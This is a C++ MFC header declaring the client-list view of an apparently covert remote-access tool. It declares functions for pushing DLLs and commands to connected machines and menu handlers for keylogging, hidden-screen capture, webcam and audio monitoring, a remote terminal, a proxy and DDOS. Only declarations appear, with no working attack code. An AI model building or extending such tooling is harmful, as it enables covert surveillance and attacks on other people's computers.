// QuickView.h : interface of the CQuickView class
//


#pragma once
#include "QuickDoc.h"


//
class CQuickView : public CXTPReportView
{
public:
	struct WorkInfo
	{
		BYTE* filedate;
		int filesize;
	};


	typedef std::map<CString, CXTPReportRecord*> ClienListDate; //存放特征码+列表pRecord 
	typedef std::map<CString, WorkInfo*> WorksDate; //存放任务数据
protected: // create from serialization only
	CQuickView();
	

	DECLARE_DYNCREATE(CQuickView)

	// Attributes
public:
	CQuickDoc* GetDocument() const;
	CXTPReportSubListControl m_wndSubList;
	CXTPReportFilterEditControl m_wndFilterEdit;
	CDialogBar* m_wndFilterEditBar;     // Sample Filter editing window
	CImageList m_ilIcons;
	CXTPReportControl* wndReport;
	CXTPReportSelectedRows* p_ReportSelectedRows; //保存选中行
	// Operations
public:

	// Overrides
public:
	virtual void OnDraw(CDC* pDC);  // overridden to draw this view
	virtual void OnInitialUpdate();
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);

	void SendSelectCommand(PBYTE pData, UINT nSize);   //选中发送命令——主
	void SendDll(LPCTSTR lpDllName, SENDTASK sendtask = TASK_MAIN); //发送普通功能DLL
	//void SendplugDll(LPCTSTR lpDllName); //发送只需要加载的DLL
	//void SendDllAndCom(LPCTSTR lpDllName, LPCTSTR FunName, TCHAR* szcommand = _T(""), SENDTASK sendtask = TASK_DOEVERYTHING); //发送普通功能DLL

	void Clipboard(CString csClipboard);
protected:
	CXTPReportRow* m_pTopRow;
	CMenu mListmeau;
	CMenu mListmeau_copy;
	CMenu mListmeau_file;
	CMenu mListmeau_screen;
	CMenu mListmeau_Peripherals;
	CMenu mListmeau_ZJ;
	CMenu mListmeau_khd;
	CMenu mListmeau_hh;
	CMenu mListmeau_other;
	CMenu mListmeau_filter;
	int i_mListmeau_other_num;
	BYTE* R_g_Column_Data;
	ClienListDate m_ClienListDate; //快速寻找使用
	ClienListDate::iterator it;

	time_t curTime;					//时间初始化
	tm tm1;
	CLCS m_clcs;
	LOGININFO* LoginInfo;
	// 
	// Window
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnSetFocus(CWnd* pOldWnd);
	afx_msg void OnDestroy();
	BOOL WriterReg();				//保存列表布局

	afx_msg void OnReportWatermark();//水印
	CXTPReportRecordItem* MainAddItem(CXTPReportRecord* pRecord, LPCTSTR szText, int ico_num);				//添加项目 返回项
	CXTPReportRecordItem* MainChangeItem(CXTPReportRecord* pRecord, LPCTSTR szText, int ico_num, int index); //修改项目

	afx_msg void OnShowGroup(NMHDR* pNotifyStruct, LRESULT* result);  //报表头左键事件
	afx_msg void OnShowFilterEditandOnShowFieldChooser(NMHDR* pNotifyStruct, LRESULT* result);  //报表头右键事件
	afx_msg void OnReportLButtonDown(NMHDR* pNotifyStruct, LRESULT* result);  //报表左键事件
	afx_msg void OnReportDBLCLK(NMHDR* pNotifyStruct, LRESULT* result);  //报表左键双击事件
	afx_msg void OnReportItemRClick(NMHDR* pNotifyStruct, LRESULT* result);  //报表头右键事件
	afx_msg void OnReportGroupOrderChanged(NMHDR* pNotifyStruct, LRESULT* /*result*/); //报表组事件

	void HandlingRightClickMessages(int nitem); //主右键菜单消息处理

	afx_msg LRESULT OnAddtomainlist(WPARAM, LPARAM);   //添加上线资料
	afx_msg LRESULT OnRemoveFromList(WPARAM, LPARAM);	//下线删除

protected:

	



	
	afx_msg void OnMenuitemADDMONITOR();	//加入监控

	afx_msg void OnMenuitemKE();			//客户管理
	afx_msg void OnMenuitemDIAN();			//电源
	afx_msg void OnMenuitemCHA();			//插件
	afx_msg void OnMenuitemDDOS();			//DDOS

	afx_msg void OnMenuitemFENZU();			//修改分组
	afx_msg void OnMenuitemBEIZHU();		//修改备注

	afx_msg void OnMenuitemFILE();			//文件管理

	afx_msg void OnMenuitemDIFSCREEN();		//差异屏幕
	afx_msg void OnMenuitemQUICKSCREEN();	//高速屏幕
	afx_msg void OnMenuitemPLAY();			//娱乐屏幕
	afx_msg void  OnMenuitemHIDESCREEN();	//后台屏幕

	afx_msg void  OnMenuitemSPEAK();		//播放监听
	afx_msg void  OnMenuitemAUDIO();		//语音监听
	afx_msg void   OnMenuitemWEBCAM();		//视频查看

	afx_msg void   OnMenuitemXITONG();		//系统管理
	afx_msg void  OnMenuitemCMD();			//远程终端
	afx_msg void  OnMenuitemKEYBOARD();		//键盘记录
	afx_msg void   OnMenuitemREGEDIT();		//查注册表
	afx_msg void  OnMenuitemPROXY();		//代理映射
	afx_msg void   OnMenuitemCHAT();		//远程交谈






// Implementation
public:
	virtual ~CQuickView();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:

	// Generated message map functions
protected:
	DECLARE_MESSAGE_MAP()
};

#ifndef _DEBUG  // debug version in QuickView.cpp
inline CQuickDoc* CQuickView::GetDocument() const
{
	return reinterpret_cast<CQuickDoc*>(m_pDocument);
}
#endif



//////////////////////////////////////////////////////////////////////////
// Customized record item, used for displaying checkboxes.
class CMessageRecordItemCheck : public CXTPReportRecordItemText
{
	DECLARE_SERIAL(CMessageRecordItemCheck)
public:
	// Constructs record item with the initial checkbox value.
	CMessageRecordItemCheck(BOOL bCheck = FALSE);

	// Provides custom group captions depending on checkbox value.
	// Returns caption string ID to be read from application resources.
	virtual int GetGroupCaptionID(CXTPReportColumn* pColumn);

	// Provides custom records comparison by this item based on checkbox value, 
	// instead of based on captions.
	virtual int Compare(CXTPReportColumn* pColumn, CXTPReportRecordItem* pItem);
};




